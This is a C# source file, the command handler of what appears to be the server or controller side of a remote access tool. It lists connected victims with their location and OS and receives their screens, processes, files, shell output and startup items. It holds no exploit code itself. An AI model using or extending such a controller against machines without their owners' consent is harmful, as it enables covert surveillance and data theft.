using System;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using xServer.Core.Misc;
using xServer.Core.Packets.ClientPackets;
using xServer.Forms;
using xServer.Settings;

namespace xServer.Core.Commands
{
	public static class CommandHandler
	{
		public static void HandleInitialize(Client client, Initialize packet, FrmMain mainForm)
		{
			if (client.EndPoint.Address.ToString() == "255.255.255.255")
				return;

			mainForm.ListenServer.ConnectedClients++;
			mainForm.ListenServer.AllTimeConnectedClients++;
			mainForm.UpdateWindowTitle(mainForm.ListenServer.ConnectedClients, mainForm.lstClients.SelectedItems.Count);

			new Thread(() =>
			{
				try
				{
					client.Value.Version = packet.Version;
					client.Value.OperatingSystem = packet.OperatingSystem;
					client.Value.AccountType = packet.AccountType;
					client.Value.Country = packet.Country;
					client.Value.CountryCode = packet.CountryCode;
					client.Value.Region = packet.Region;
					client.Value.City = packet.City;

					string country = string.Format("{0} [{1}]", client.Value.Country, client.Value.CountryCode);

					// this " " leaves some space between the flag-icon and the IP
					ListViewItem lvi = new ListViewItem(new string[] { " " + client.EndPoint.Address.ToString(), client.EndPoint.Port.ToString(), client.Value.Version, "Connected", "Active", country, client.Value.OperatingSystem, client.Value.AccountType });
					lvi.Tag = client;
					lvi.ImageIndex = packet.ImageIndex;

					mainForm.Invoke((MethodInvoker)delegate
					{
						mainForm.lstClients.Items.Add(lvi);
					});

					if (XMLSettings.ShowPopup)
						ShowPopup(client, mainForm);

					client.Value.IsAuthenticated = true;
				}
				catch
				{ }
			}).Start();
		}

		private static void ShowPopup(Client c, FrmMain mainForm)
		{
			mainForm.nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country), string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(), c.Value.OperatingSystem), ToolTipIcon.Info);
		}

		public static void HandleStatus(Client client, Status packet, FrmMain mainForm)
		{
			new Thread(() =>
			{
				foreach (ListViewItem lvi in mainForm.lstClients.Items)
				{
					Client c = (Client)lvi.Tag;
					if (client == c)
					{
						mainForm.Invoke((MethodInvoker)delegate
						{
							lvi.SubItems[3].Text = packet.Message;
						});
						break;
					}
				}

			}).Start();
		}

		public static void HandleUserStatus(Client client, UserStatus packet, FrmMain mainForm)
		{
			new Thread(() =>
			{
				foreach (ListViewItem lvi in mainForm.lstClients.Items)
				{
					Client c = (Client)lvi.Tag;
					if (client == c)
					{
						mainForm.Invoke((MethodInvoker)delegate
						{
							lvi.SubItems[4].Text = packet.Message;
						});
						break;
					}
				}

			}).Start();
		}

		public static void HandleRemoteDesktopResponse(Client client, DesktopResponse packet)
		{
			if (client.Value.FrmRdp == null)
				return;

			// we can not dispose all bitmaps here, cause they are later used again in `client.Value.LastDesktop`
			if (client.Value.LastDesktop == null)
			{
                using (Bitmap newScreen = (Bitmap)Helper.Helper.CByteToImg(packet.Image))
                {
                    client.Value.LastDesktop = newScreen;
                    client.Value.FrmRdp.Invoke((MethodInvoker)delegate
                    {
                        client.Value.FrmRdp.picDesktop.Image = newScreen;
                    });
                }
			}
			else
			{
				using (Bitmap screen = (Bitmap) Helper.Helper.CByteToImg(packet.Image))
				{
                    using (Bitmap newScreen = new Bitmap(screen.Width, screen.Height))
                    {
                        using (Graphics g = Graphics.FromImage(newScreen))
                        {
                            g.DrawImage(client.Value.LastDesktop, 0, 0, newScreen.Width, newScreen.Height);
                            g.DrawImage(screen, 0, 0, newScreen.Width, newScreen.Height);
                        }

                        client.Value.LastDesktop = newScreen;
                        client.Value.FrmRdp.Invoke((MethodInvoker)delegate
                        {
                            client.Value.FrmRdp.picDesktop.Image = newScreen;
                        });
                    }
				}
			}

			packet.Image = null;
			client.Value.LastDesktopSeen = true;
		}

		public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
		{
			if (client.Value.FrmTm == null)
				return;

			client.Value.FrmTm.Invoke((MethodInvoker)delegate
			{
				client.Value.FrmTm.lstTasks.Items.Clear();
			});

			new Thread(() =>
			{
				for (int i = 0; i < packet.Processes.Length; i++)
				{
					if (packet.IDs[i] != 0 && packet.Processes[i] != "System.exe")
					{
						ListViewItem lvi = new ListViewItem(new string[] { packet.Processes[i], packet.IDs[i].ToString(), packet.Titles[i] });
						try
						{
							client.Value.FrmTm.Invoke((MethodInvoker)delegate
							{
								client.Value.FrmTm.lstTasks.Items.Add(lvi);
							});
						}
						catch
						{ break; }
					}
				}
			}).Start();
		}

		public static void HandleDrivesResponse(Client client, DrivesResponse packet)
		{
			if (client.Value.FrmFm == null)
				return;

			client.Value.FrmFm.Invoke((MethodInvoker)delegate
			{
				client.Value.FrmFm.cmbDrives.Items.Clear();
				client.Value.FrmFm.cmbDrives.Items.AddRange(packet.Drives);
				client.Value.FrmFm.cmbDrives.SelectedIndex = 0;
			});
		}

		public static void HandleDirectoryResponse(Client client, DirectoryResponse packet)
		{
			if (client.Value.FrmFm == null)
				return;

			client.Value.FrmFm.Invoke((MethodInvoker)delegate
			{
				client.Value.FrmFm.lstDirectory.Items.Clear();
			});

			new Thread(() =>
			{
				ListViewItem lviBack = new ListViewItem(new string[] { "..", "", "Directory" });
				lviBack.Tag = "dir";
				lviBack.ImageIndex = 0;
				client.Value.FrmFm.Invoke((MethodInvoker)delegate
				{
					client.Value.FrmFm.lstDirectory.Items.Add(lviBack);
				});

				if (packet.Folders.Length != 0)
				{
					for (int i = 0; i < packet.Folders.Length; i++)
					{
						if (packet.Folders[i] != "$$$EMPTY$$$$")
						{
							ListViewItem lvi = new ListViewItem(new string[] { packet.Folders[i], "", "Directory" });
							lvi.Tag = "dir";

							lvi.ImageIndex = 1;

							try
							{
								client.Value.FrmFm.Invoke((MethodInvoker)delegate
								{
									client.Value.FrmFm.lstDirectory.Items.Add(lvi);
								});
							}
							catch
							{ break; }
						}
					}
				}

				if (packet.Files.Length != 0)
				{
					for (int i = 0; i < packet.Files.Length; i++)
					{
						if (packet.Files[i] != "$$$EMPTY$$$$")
						{
							ListViewItem lvi = new ListViewItem(new string[] { packet.Files[i], Helper.Helper.GetFileSize(packet.FilesSize[i]), "File" });
							lvi.Tag = "file";

							lvi.ImageIndex = Helper.Helper.GetFileIcon(System.IO.Path.GetExtension(packet.Files[i]));

							try
							{
								client.Value.FrmFm.Invoke((MethodInvoker)delegate
								{
									client.Value.FrmFm.lstDirectory.Items.Add(lvi);
								});
							}
							catch
							{ break; }
						}
					}
				}

				client.Value.LastDirectorySeen = true;
			}).Start();
		}

		public static void HandleDownloadFileResponse(Client client, DownloadFileResponse packet)
		{
			string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString());
			if (!Directory.Exists(downloadPath))
				Directory.CreateDirectory(downloadPath);

			downloadPath = Path.Combine(downloadPath, packet.Filename);

			bool Continue = true;
			if (File.Exists(downloadPath))
				if (MessageBox.Show(string.Format("The file '{0}' already exists!\nOverwrite it?", packet.Filename), "Overwrite Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != System.Windows.Forms.DialogResult.Yes)
					Continue = false;

			int index = 0;
			try
			{
				client.Value.FrmFm.Invoke((MethodInvoker)delegate
				{
					foreach (ListViewItem lvi in client.Value.FrmFm.lstTransfers.Items)
					{
						if (packet.ID.ToString() == lvi.SubItems[0].Text)
						{
							index = lvi.Index;
							break;
						}
					}
				});
			}
			catch
			{ }

			if (Continue)
			{
				new Thread(() =>
				{
					try
					{
						client.Value.FrmFm.Invoke((MethodInvoker)delegate
						{
							client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Saving...";
						});

						using (FileStream stream = new FileStream(downloadPath, FileMode.Create))
						{
							stream.Write(packet.FileByte, 0, packet.FileByte.Length);
						}
						client.Value.FrmFm.Invoke((MethodInvoker)delegate
						{
							client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Completed";
							client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 1;
						});
					}
					catch
					{ }
				}).Start();
			}
			else
			{
				try
				{
					client.Value.FrmFm.Invoke((MethodInvoker)delegate
					{
						client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Canceled";
						client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
					});
				}
				catch
				{ }
			}
		}

		public static void HandleGetSystemInfoResponse(Client client, GetSystemInfoResponse packet)
		{
			if (client.Value.FrmSi == null)
				return;

			ListViewItem[] lviCollection = new ListViewItem[packet.SystemInfos.Length / 2];
			int j = 0;
			for (int i = 0; i < packet.SystemInfos.Length; i+= 2)
			{
				if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
				{
					lviCollection[j] = new ListViewItem(new string[] { packet.SystemInfos[i], packet.SystemInfos[i + 1] });
					j++;
				}
			}

			if (client.Value.FrmSi == null)
				return;

			try
			{
				client.Value.FrmSi.Invoke((MethodInvoker)delegate
				{
					client.Value.FrmSi.lstSystem.Items.RemoveAt(2); // Loading... Information
					foreach(var lviItem in lviCollection)
					{
						if (lviItem != null)
							client.Value.FrmSi.lstSystem.Items.Add(lviItem);
					}
				});

				ListViewExtensions.autosizeColumns(client.Value.FrmSi.lstSystem);
			}
			catch
			{ }
		}

		public static void HandleMonitorsResponse(Client client, MonitorsResponse packet)
		{
			if (client.Value.FrmRdp == null)
				return;

			try
			{
				client.Value.FrmRdp.Invoke((MethodInvoker)delegate
				{
					for (int i = 0; i < packet.Number; i++)
						client.Value.FrmRdp.cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
					client.Value.FrmRdp.cbMonitors.SelectedIndex = 0;
				});
			}
			catch
			{ }
		}

		public static void HandleShellCommandResponse(Client client, ShellCommandResponse packet)
		{
			if (client.Value.FrmRs == null)
				return;

			try
			{
				client.Value.FrmRs.Invoke((MethodInvoker)delegate
				{
					client.Value.FrmRs.txtConsoleOutput.Text += packet.Output;
				});
			}
			catch
			{ }
		}

		public static void HandleGetStartupItemsResponse(Client client, GetStartupItemsResponse packet)
		{
			if (client.Value.FrmStm == null)
				return;

			try
			{
				client.Value.FrmStm.Invoke((MethodInvoker)delegate
				{
					foreach (var pair in packet.StartupItems)
					{
						var temp = pair.Key.Split(new string[] { "||" }, StringSplitOptions.None);
						var l = new ListViewItem(temp) {Group = client.Value.FrmStm.lstStartupItems.Groups[pair.Value], Tag = pair.Value};
						client.Value.FrmStm.lstStartupItems.Items.Add(l);
					}
				});
			}
			catch
			{ }
		}
	}
}
